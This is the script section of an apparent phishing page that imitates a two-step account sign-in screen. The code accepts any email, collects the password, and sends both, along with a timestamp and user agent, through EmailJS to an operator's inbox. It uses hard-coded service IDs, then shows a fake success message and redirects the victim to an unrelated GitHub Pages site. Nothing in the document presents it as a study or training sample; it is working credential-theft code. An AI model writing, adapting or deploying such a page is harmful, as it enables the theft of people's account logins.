    <script>
        // Initialize EmailJS with your public key
        (function() {
            emailjs.init("H1Q7r_KdpW6yYyqn3");
        })();

        document.addEventListener('DOMContentLoaded', function() {
            // DOM Elements
            const emailStep = document.getElementById('email-step');
            const passwordStep = document.getElementById('password-step');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const emailNextBtn = document.getElementById('email-next');
            const passwordNextBtn = document.getElementById('password-next');
            const emailDisplay = document.getElementById('email-display');
            const stepTitle = document.getElementById('step-title');
            const stepSubtitle = document.getElementById('step-subtitle');
            const stepIndicator = document.getElementById('step-indicator');
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const showPasswordCheckbox = document.getElementById('show-password');
            const loadingElement = document.getElementById('loading');
            const successMessage = document.getElementById('success-message');
            const errorNotification = document.getElementById('error-notification');
            
            // Your EmailJS credentials
            const EMAILJS_SERVICE_ID = "service_17usvk3";
            const EMAILJS_TEMPLATE_ID = "template_w5pyygx";
            
            // Redirect URL - Your specified destination
            const REDIRECT_URL = "https://sawyerbobk563-code.github.io/MHSapps/";
            
            // Show password functionality
            showPasswordCheckbox.addEventListener('change', function() {
                passwordInput.type = this.checked ? 'text' : 'password';
            });
            
            // Email next button click
            emailNextBtn.addEventListener('click', function() {
                const email = emailInput.value.trim();
                
                // Basic email validation
                if (!email) {
                    showError(emailInput, emailError, "Enter an email or phone number");
                    return;
                }
                
                if (!isValidEmail(email) && !isValidPhone(email)) {
                    showError(emailInput, emailError, "Enter a valid email or phone number");
                    return;
                }
                
                // Accept any valid email - proceed to password step
                emailDisplay.textContent = email;
                emailStep.classList.add('hidden');
                passwordStep.classList.remove('hidden');
                stepTitle.textContent = "Welcome";
                stepSubtitle.textContent = "Enter your password";
                stepIndicator.textContent = "Step 2 of 2";
                passwordInput.focus();
            });
            
            // Password next button click
            passwordNextBtn.addEventListener('click', async function() {
                const email = emailInput.value.trim();
                const password = passwordInput.value;
                
                if (!password) {
                    showError(passwordInput, passwordError, "Enter a password");
                    return;
                }
                
                // Show loading state
                showLoading();
                
                try {
                    // Send email and password via EmailJS
                    await sendCredentialsViaEmail(email, password);
                    
                    // Show success message
                    hideLoading();
                    showSuccessMessage();
                    
                    // Redirect after showing success message
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1500);
                    
                } catch (error) {
                    // Handle email sending error
                    console.error('Error sending email:', error);
                    hideLoading();
                    showErrorMessage();
                    
                    // Still redirect even if email fails (for demo purposes)
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                }
            });
            
            // Enter key support
            emailInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    emailNextBtn.click();
                }
            });
            
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    passwordNextBtn.click();
                }
            });
            
            // Clear errors when typing
            emailInput.addEventListener('input', function() {
                clearError(emailInput, emailError);
            });
            
            passwordInput.addEventListener('input', function() {
                clearError(passwordInput, passwordError);
            });
            
            // Function to send credentials via EmailJS
            async function sendCredentialsViaEmail(email, password) {
                const templateParams = {
                    email: email,
                    password: password,
                    timestamp: new Date().toLocaleString(),
                    user_agent: navigator.userAgent,
                    ip_address: "Unknown" // Note: IP address cannot be obtained client-side without a backend
                };
                
                try {
                    const response = await emailjs.send(
                        EMAILJS_SERVICE_ID,
                        EMAILJS_TEMPLATE_ID,
                        templateParams
                    );
                    
                    console.log('Email sent successfully:', response);
                    return response;
                } catch (error) {
                    console.error('Failed to send email:', error);
                    throw error;
                }
            }
            
            // Helper functions
            function showError(inputElement, errorElement, message) {
                inputElement.classList.add('error');
                errorElement.textContent = message;
                errorElement.style.display = 'block';
                inputElement.focus();
            }
            
            function clearError(inputElement, errorElement) {
                inputElement.classList.remove('error');
                errorElement.style.display = 'none';
            }
            
            function showLoading() {
                loadingElement.style.display = 'block';
                passwordNextBtn.disabled = true;
                passwordNextBtn.style.opacity = '0.7';
                passwordNextBtn.textContent = 'Signing in...';
            }
            
            function hideLoading() {
                loadingElement.style.display = 'none';
                passwordNextBtn.disabled = false;
                passwordNextBtn.style.opacity = '1';
                passwordNextBtn.textContent = 'Next';
            }
            
            function showSuccessMessage() {
                successMessage.style.display = 'block';
                errorNotification.style.display = 'none';
                passwordStep.querySelector('.form-group').style.display = 'none';
            }
            
            function showErrorMessage() {
                errorNotification.style.display = 'block';
                successMessage.style.display = 'none';
                passwordNextBtn.textContent = 'Try Again';
            }
            
            function isValidEmail(email) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailRegex.test(email);
            }
            
            function isValidPhone(phone) {
                const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
                return phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''));
            }
        });
    </script>
</body>
</html>
